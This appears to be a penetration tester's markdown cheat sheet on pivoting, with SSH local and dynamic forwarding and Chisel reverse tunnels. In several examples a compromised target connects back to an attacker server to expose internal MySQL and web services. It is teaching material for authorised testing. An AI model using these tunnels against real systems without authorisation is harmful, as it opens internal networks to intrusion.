---
Primary_category: "[[PENTESTING ROOT]]"
title: "PIVOTING, TUNNELING, PORT FORWARDING"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[PENTESTING ROOT]]

#### Local Port Forwarding

##### *SSH*

###### *From the Attacker*

```bash
ssh -p<PORT> -fN -L <LOCAL_PORT>:localhost:<TARGET_PORT> <USER>@<TARGET>
```

> [!BUG]- *e.g.*
>
> If there is a *port 3306* that can only be accessed locally, perform *local port forwarding* to establish a tunnel from a given *local port* to the *remote port 3306*
>
> ```bash
> ssh -p22 -fN -L 3306:localhost:3306 john@domain.tld
> ```
>
> Then, to connect to that port using the `mysql` client →
>
> ```bash
> mysql --user='john' --password='anyRandomPassword' --host='localhost' --port=3306 --database='database'
> ```
>

##### *Chisel*

> ***[Reference](https://github.com/jpillora/chisel)***

###### *From the Attacker*

```bash
./chisel server --reverse --port <PORT>
```

###### *From the Target*

```bash
./chisel client <ATTACKER>:<CHISEL_PORT> R:<ATTACKER_PORT>:localhost:<TARGET_PORT>
```

> [!BUG]- *e.g.*
>
> If there is a *port 3306* that can only be accessed locally, perform *local port forwarding* to establish a tunnel from a given *local port* to the *remote port 3306*
>
> This time, the *target* initiates the connection to the *chisel server* and, again, the *attacker* establishes the *tunnel*
>
> - ***From the Attacker*** ⚔️
>
> ```bash
> ./chisel server --reverse --port 1234 	
> ```
>
> - ***From the Target*** 🎯
>
> ```bash
> ./chisel client 10.10.10.10:1234 3306:localhost:3306
> ```
> 
> Then, to connect to that port using the `mysql` client →
>
> ```bash
> mysql --user='john' --password='anyRandomPassword' --host='localhost' --port=3306 --database='database'
> ```
>

---

#### Dynamic Port Forwarding

##### *SSH*

###### *From the Attacker*

```bash
ssh -p<PORT> -fN -D <SOCKS_PORT> <USER>@<TARGET>
```

> ***It sets up a SOCKS5 Proxy on the localhost:<PORT\>***

> [!BUG]- *e.g.*
>
> If there is another host, on the internal network, running a *Web Server* on *port 8080*, which is not accesible from the internet, and an attacker wants to connect to this *Web Server* and its *database* as well, proceed as follows
>
> ```bash
> ssh -p22 -fN -D 1234 john@server1.domain.tld
> ```
>
> To send an *HTTP Request* to the *internal server*
>
> ```bash
> curl --silent --location --request GET --socks5 localhost:1234 "http://server2.domain.tld"
> ``` 
>
> > ***If any DNS Error arises, use `--socks5-hostname localhost:<PORT>`***
>
> Assuming that the *Database* is not only running on *locahost* and is accessible from all other *internal hosts*, to connect to it
>
> ```bash title="/etc/proxychains.conf"
> socks5 127.0.0.1 1234
> ```
>
> ```bash
> proxychains mysql --user='john' --password='anyRandomPassword' --host='server2.domain.tld' --port=3306 --database='database'
> ```
>

##### *Chisel*

> ***[Reference](https://github.com/jpillora/chisel)***

###### *From the Attacker*

```bash
./chisel server --reverse --port <PORT> --socks5
```

###### *From the Target*

```bash
./chisel client <ATTACKER>:<CHISEL_PORT> R:socks # Port 1080 by default
./chisel client <ATTACKER>:<CHISEL_PORT> R:socks:<SOCKS_PORT>
```

> [!BUG]- *e.g.*
>
> If there is another host, on the internal network, running a *Web Server* on *port 8080*, which is not accesible from the internet, and an attacker wants to connect to this *Web Server* and its *database* as well, proceed as follows
>
> - ***From the Attacker*** ⚔️
>
> ```bash
> ./chisel server --reverse --port 1234 --socks5 
> ```
>
> - ***From the Target*** 🎯
>
> ```bash
> ./chisel client 10.10.10.10:1234 R:socks:5555
> ```
>
> To send an *HTTP Request* to the *internal server*
>
> ```bash
> curl --silent --location --request GET --socks5 localhost:5555 "http://server2.domain.tld"
> ``` 
>
> > ***If any DNS Error arises, use `--socks5-hostname localhost:<PORT>`***
>
> Assuming that the *Database* is not only running on *locahost* and is accessible from all other *internal hosts*, to connect to it
>
> ```bash title="/etc/proxychains.conf"
> socks5 127.0.0.1 5555
> ```
>
> ```bash
> proxychains mysql --user='john' --password='anyRandomPassword' --host='server2.domain.tld' --port=3306 --database='database'
> ```
>